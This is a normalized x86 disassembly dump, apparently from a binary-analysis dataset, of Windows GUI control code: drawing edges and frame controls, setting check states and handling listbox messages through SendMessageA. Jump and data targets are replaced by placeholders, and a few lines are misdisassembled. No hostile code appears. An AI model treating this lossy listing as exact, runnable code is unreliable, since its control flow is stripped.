call sub_423fb4
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4243dc
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4243dc
cmp [ ebx + 0x165 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403290
retn
xor esi esi
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add esi [ ebx + 0x168 ]
test esi esi
jne r-xdata
add esi [ ebx + 0x168 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_448494
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_4248b4
push eax
call GetWindowLongA
mov edi eax
test [ ebx + 0x162 ] 0x1
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_423fb4
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4243dc
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4243dc
test [ ebx + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x24 ] esi
test [ ebx + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x20 ] esi
test edi 0x200000
je r-xdata
add [ ebp - 0x1c ] esi
test [ ebx + 0x162 ] 0x8
je r-xdata
push 0x14
call GetSystemMetrics
add [ ebp - 0x1c ] eax
test edi 0x100000
je r-xdata
add [ ebp - 0x18 ] esi
xor eax eax
mov al [ ebx + 0x162 ]
xor edx edx
mov dl [ ebx + 0x165 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
xor eax eax
mov al [ ebx + 0x163 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4248b4
push eax
call DrawEdge
push 0xa
call GetSystemMetrics
mov edx [ ebp - 0xc ]
sub edx eax
dec edx
mov [ ebp - 0x14 ] edx
mov eax ebx
call sub_43e284
test al al
je r-xdata
push 0x15
call GetSystemMetrics
add [ ebp - 0x18 ] eax
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4248b4
push eax
call DrawFrameControl
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4248b4
push eax
call DrawFrameControl
jmp r-xdata
sub_43fcac
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44afd4
mov eax esi
mov edx [ r-xdata ]
call sub_403440
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_43fcd0
push ebx
mov ebx eax
mov eax ebx
call sub_4550c4
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403440
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_43fd08
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_43fd5e
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_43fd6c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44b008
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_43fdc0
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_44fdac
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_43fe14
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_43fe38
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_44ccf0
mov eax ebx
mov si 0xffb5
call sub_40348c
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_44f2dc
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_40348c
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_43feb0
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_43936c
mov ebx eax
mov eax ebx
call sub_43944c
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_44f2dc
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_43954c
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_43fefc
push ebx
push esi
mov esi edx
mov ebx eax
call sub_43936c
call sub_43944c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_44d730
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_43ff28
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44c168
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_43ff60
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43fd6c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_4482b0
mov edx 0x19
mov eax esi
call sub_4482d4
mov dl 0x1
mov eax esi
call sub_44f510
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_43ffec
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_44f5e0
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_44f2dc
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
call sub_44f2dc
push eax
call GetWindowLongA
and eax 0xf
movzx edi si
cmp eax edi
je r-xdata
sub_440040
push ebx
mov ebx eax
mov [ ebx + 0x210 ] dl
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
pop ebx
retn
mov eax ebx
call sub_45f870
test eax eax
je r-xdata
mov edx [ eax + 0x220 ]
push edx
xor ecx ecx
mov edx 0xb007
call sub_449ca8
sub_440074
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43ff28
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_44c094
xor eax eax
mov al [ ebx + 0x210 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_4400dc
push ebx
push esi
push edi
mov edi edx
mov ebx eax
cmp [ edi + 0x4 ] 0xd
jne r-xdata
cmp [ edi + 0x4 ] 0x1b
jne r-xdata
cmp [ ebx + 0x212 ] 0x0
jne r-xdata
mov edx edi
mov eax ebx
call sub_44e758
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
call sub_45f778
mov dl [ r-xdata ]
cmp dl al
jne r-xdata
mov eax ebx
mov si 0xffb8
call sub_40348c
test al al
je r-xdata
mov eax ebx
mov si 0xffeb
call sub_40348c
mov [ edi + 0xc ] 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44018b
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44e760
mov eax ebx
mov si 0xffeb
call sub_40348c
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4401c9
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_4401d0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ esi + 0x8 ]
mov eax edi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
cmp ebx edi
sete al
mov [ ebx + 0x212 ] al
jmp r-xdata
mov dl [ ebx + 0x212 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov edx esi
mov eax ebx
call sub_44e768
pop edi
pop esi
pop ebx
retn
sub_440224
push ebx
push esi
mov esi edx
mov ebx eax
call sub_43936c
call sub_43944c
test al al
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_440250
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_43936c
mov ebx eax
mov eax ebx
call sub_43944c
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_44f2dc
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_43954c
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44029c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43fd6c
mov edx 0x61
mov eax esi
call sub_4482b0
mov edx 0x11
mov eax esi
call sub_4482d4
mov dl 0x1
mov eax esi
call sub_44f510
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_440308
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_40348c
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_440334
mov dl [ eax + 0x212 ]
sub dl 0x1
jb r-xdata
cmp [ eax + 0x211 ] 0x0
je r-xdata
je r-xdata
mov dl 0x1
call sub_4403bc
retn
mov dl 0x2
call sub_4403bc
jmp r-xdata
xor edx edx
call sub_4403bc
retn
dec dl
je r-xdata
retn
mov dl 0x1
call sub_4403bc
jmp r-xdata
sub_4403bc
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x212 ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_44f5e0
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_40348c
sub_440410
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_43ff28
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_44c094
mov eax ebx
mov si 0xffc8
call sub_40348c
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x5
or eax edx
mov [ edi + 0x4 ] eax
and [ edi + 0x24 ] 0xfffffffc
pop edi
pop esi
pop ebx
retn
sub_44046b
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x41e1173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x212 ]
push eax
push 0xf1
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
pop ebx
retn
sub_4404b4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_440542
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_448af4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45f800
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44e760
mov eax ebx
mov si 0xffb8
call sub_40348c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov eax ebx
mov si 0xffb5
call sub_40348c
test al al
je r-xdata
mov [ edi + 0xc ] 0x1
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440549
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_440560
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43fd6c
mov edx 0x71
mov eax esi
call sub_4482b0
mov edx 0x11
mov eax esi
call sub_4482d4
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035dc
mov eax esi
pop esi
pop ebx
retn
call sub_403634
pop [ fs : 0x0 ]
add esp 0xc
sub_4405c8
push ebx
push esi
mov ebx eax
mov eax ebx
mov si 0xffc8
call sub_40348c
test al al
jne r-xdata
cmp [ ebx + 0x210 ] 0x1
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov al 0x1
xor eax eax
jmp r-xdata
pop esi
pop ebx
retn
sub_440608
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
call sub_44c00c
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec esi
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_44bfd0
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov edi ebx
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
cmp [ eax + 0x95 ] 0x0
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x3c ]
xor edx edx
call sub_455358
sub_4406c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp bl [ eax + 0x211 ]
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x211 ] bl
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44f510
mov eax [ ebp - 0x4 ]
call sub_44f5e0
test al al
je r-xdata
test bl bl
je r-xdata
push 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
and eax 0x7f
push eax
push 0xf1
mov eax [ ebp - 0x4 ]
call sub_44f2dc
push eax
call SendMessageA
push ebp
call sub_440608
pop ecx
mov eax [ ebp - 0x4 ]
call sub_448700
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x208 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_40348c
sub_440750
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_43ff28
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_44c094
mov eax ebx
mov si 0xffc8
call sub_40348c
and eax 0x7f
lea eax [ eax * 8 + rw-data ]
xor edx edx
mov dl [ ebx + 0x210 ]
mov eax [ eax + edx * 4 ]
mov edx [ edi + 0x4 ]
or edx 0x4
or eax edx
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
retn
sub_4407a7
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x451d173d ]
add [ eax ] al
push 0x0
xor eax eax
mov al [ ebx + 0x211 ]
push eax
push 0xf1
mov eax ebx
call sub_44f2dc
push eax
call SendMessageA
pop ebx
retn
sub_4407dc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_440851
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_448af4
mov edx [ ebp - 0x4 ]
mov ax [ edi + 0x4 ]
call sub_45f800
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44e760
mov eax ebx
mov si 0xffb8
call sub_40348c
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440858
lea eax [ ebp - 0x4 ]
call sub_404008
retn
sub_440860
push esi
mov esi eax
mov ax [ edx + 0x6 ]
sub ax 0x1
jb r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
retn
sub ax 0x4
je r-xdata
mov eax esi
mov si 0xffe9
call sub_40348c
jmp r-xdata
pop esi
retn
sub_4408ac
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_440970
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
push 0x0
push edi
push 0x18a
mov eax esi
call sub_44f2dc
push eax
call SendMessageA
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_442560
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404654
test esi esi
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d38
mov edx [ ebp - 0x8 ]
mov ecx edi
mov eax ebx
call sub_4196b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440977
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4044c8
push eax
push edi
push 0x189
mov eax [ ebx + 0x10 ]
call sub_44f2dc
push eax
call SendMessageA
mov esi eax
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404654
sub_440980
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_440a03
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov al [ edi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffb1
call sub_40348c
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_442580
mov esi eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440a0a
lea eax [ ebp - 0x8 ]
call sub_404008
retn
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d38
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_4196b4
sub_440a14
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov eax [ edi + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ esp + 0x4 ] eax
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb3
call sub_40348c
mov [ esp + 0x8 ] eax
xor ecx ecx
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb2
call sub_40348c
mov edx ebp
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
push 0x0
mov ecx [ esp + 0x4 ]
mov edx ebp
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x64 ]
mov ecx [ esp + 0x8 ]
mov edx ebp
mov eax [ edi + 0x10 ]
mov si 0xffb2
call sub_40348c
mov edx [ esp + 0x4 ]
mov eax [ edi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
sub_440a94
push esi
mov esi eax
cmp edx 0xffffffff
je r-xdata
pop esi
retn
mov eax [ esi + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
mov eax [ esi + 0x10 ]
mov si 0xffb0
call sub_40348c
sub_440abc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_440b49
push [ fs : eax ]
mov [ fs : eax ] esp
or esi 0xffffffff
mov edi [ ebx + 0x10 ]
mov al [ edi + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440b50
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
push 0x0
push 0x180
mov eax edi
call sub_44f2dc
push eax
call SendMessageA
mov esi eax
test esi esi
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
sub_440b5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_440be5
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440bec
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
call sub_4044c8
push eax
push edi
push 0x181
mov eax esi
call sub_44f2dc
push eax
call SendMessageA
test eax eax
jge r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d38
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b790
call sub_403a44
sub_440c04
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_440d54
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440d5b
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40402c
retn
mov eax [ ebp - 0x4 ]
call sub_419538
xor eax eax
push ebp
push sub_440d32
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb3
call sub_40348c
mov [ ebp - 0x8 ] eax
lea ecx [ ebp - 0x10 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx edi
mov si 0xffb3
call sub_40348c
mov ecx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov si 0xffb2
call sub_40348c
mov ecx [ ebp - 0xc ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
mov si 0xffb2
call sub_40348c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp ebx eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xcc ]
cmp edi eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0xd0 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4195f4
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
sub_440d74
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_44f2dc
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x10 ]
call sub_449030
sub_440da8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x10 ]
mov al [ esi + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax edi
call sub_4044c8
push eax
push 0xffffffff
push 0x1a2
mov eax esi
call sub_44f2dc
push eax
call SendMessageA
mov edx edi
mov eax esi
call sub_4425a8
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_440dec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_440eeb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jb r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_440ef2
lea eax [ ebp - 0xc ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
call sub_419538
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ eax + 0x278 ] 0x1
xor eax eax
push ebp
push sub_440ece
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov [ eax + 0x278 ] 0x0
mov eax [ ebp - 0x4 ]
call sub_4195f4
